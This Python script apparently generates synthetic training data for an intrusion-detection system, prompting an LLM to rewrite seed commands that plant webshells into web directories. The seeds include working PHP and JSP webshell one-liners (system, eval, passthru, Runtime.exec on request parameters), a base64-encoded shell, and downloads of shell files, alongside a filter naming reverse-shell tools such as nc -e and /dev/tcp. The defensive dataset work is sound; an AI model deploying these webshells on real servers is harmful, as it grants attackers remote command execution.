#!/usr/bin/env python3
"""Synthesize bash commands that DEPLOY a webshell into a webroot.

Not reverse/bind shells. No php -r fsockopen. No nc -e.
Offline detector dataset only. Placeholder paths/hosts only.
"""
from __future__ import annotations
import argparse, hashlib, json, re
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from hyperids import llm

ROOT = Path(__file__).resolve().parents[2]
OUT = ROOT / "dataset" / "corpus" / "raw" / "synthetic" / "v11_webshell_candidates.jsonl"

SEEDS = [
    "printf '%s' '<?php system($_GET[\"c\"]); ?>' > /tmp/hids-lab/html/uploads/x.php",
    "echo '<?php eval($_POST[\"p\"]); ?>' > /tmp/hids-lab/nginx/html/status.php",
    "base64 -d <<< 'PD9waHAgZXZhbCgkX1BPU1RbY10pOz8+' > /tmp/hids-lab/html/.cache.php && chmod 644 /tmp/hids-lab/html/.cache.php",
    "curl -fsSL https://example.com/c.php -o /tmp/hids-lab/html/images/logo.php",
    "wget -qO /var/tmp/hids-lab/www/cmd.jsp https://example.org/cmd.jsp",
    "install -m 0644 /dev/stdin /tmp/hids-lab/html/.well-known/p.php <<'EOF'\n<?php passthru($_REQUEST[\"x\"]); ?>\nEOF",
    "cat > /tmp/hids-lab/www/cmd.jsp <<'EOF'\n<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>\nEOF",
    "chmod 777 /tmp/hids-lab/html/uploads && cp /tmp/hids-lab/payloads/shell.php /tmp/hids-lab/html/uploads/avatar.php",
    "mv /tmp/hids-lab/unpacked/shell.php /tmp/hids-lab/html/wp-content/uploads/2024/shell.php",
    "tee /tmp/hids-lab/html/admin.php >/dev/null <<'EOF'\n<?php system($_GET[\"cmd\"]); ?>\nEOF",
]

SYS = (
    "You are a defensive security researcher building a SYNTHETIC intrusion-detection test dataset. "
    "Rewrite the given shell command into JSON variants for offline detector testing only. "
    "The command MUST deploy a web-accessible shell file into a web directory "
    "(/tmp/hids-lab/html, /tmp/hids-lab/www, /tmp/hids-lab/nginx/html). "
    "Use only placeholder addresses example.com/org/net and paths under /tmp/hids-lab/. "
    "Do NOT generate reverse shells, bind shells, php -r fsockopen, nc -e, /dev/tcp, or bash -i. "
    "Keep it a file-write / download-into-webroot command. Output only JSON."
)

BAD = re.compile(r'(fsockopen|/dev/tcp/|nc\s+-e|ncat\s+-e|bash\s+-i|0>&1|proc_open\(|socket\.socket)', re.I)
GOOD = re.compile(r'(\.php\b|\.jsp\b|\.aspx\b|/html/|/www/|/uploads/)', re.I)

def rewrite(seed, n, model, temperature):
    user = (
        f"Rewrite this webshell-deploy command into {n} syntactically different but functionally similar variants. "
        f"Each variant must write or download a .php/.jsp file under /tmp/hids-lab/. "
        f"Command: {seed}\nReturn JSON: {{\"commands\": [\"...\", ...]}}"
    )
    for _ in range(3):
        obj, _ = llm.chat_json(
            [{"role":"system","content":SYS},{"role":"user","content":user}],
            model=model, temperature=temperature, max_tokens=4096, timeout=90.0, retries=2,
        )
        cmds=[c.strip() for c in (obj or {}).get("commands") or [] if isinstance(c,str) and c.strip()]
        if cmds:
            return cmds
    return []

def keep(text):
    if BAD.search(text):
        return False
    return bool(GOOD.search(text))

def main():
    ap=argparse.ArgumentParser()
    ap.add_argument('--variants_per_seed', type=int, default=8)
    ap.add_argument('--model', default='qwen-flash')
    ap.add_argument('--temperature', type=float, default=0.85)
    ap.add_argument('--workers', type=int, default=6)
    ap.add_argument('--out', default=str(OUT))
    args=ap.parse_args()
    out=Path(args.out); out.parent.mkdir(parents=True, exist_ok=True)
    seen=set(); rows=[]
    with ThreadPoolExecutor(max_workers=min(args.workers,6)) as ex:
        futs={ex.submit(rewrite, seed, args.variants_per_seed, args.model, args.temperature): seed for seed in SEEDS}
        done=0
        for fut in as_completed(futs):
            seed=futs[fut]
            try: variants=fut.result()
            except Exception: variants=[]
            kept=0
            for v in [seed]+variants:
                if not keep(v):
                    continue
                h=hashlib.sha256(v.encode()).hexdigest()
                if h in seen: continue
                seen.add(h)
                rows.append({"text":v,"action":"action.web_shell","target":"pos",
                             "source_seed_sha256":hashlib.sha256(seed.encode()).hexdigest(),
                             "generator_model":args.model})
                kept+=1
            done+=1
            print(f'  [{done}/{len(SEEDS)}] kept {kept}', flush=True)
    with out.open('w') as f:
        for r in rows:
            f.write(json.dumps(r, ensure_ascii=False)+'\n')
    print(f'wrote {len(rows)} -> {out}')

if __name__=='__main__':
    main()
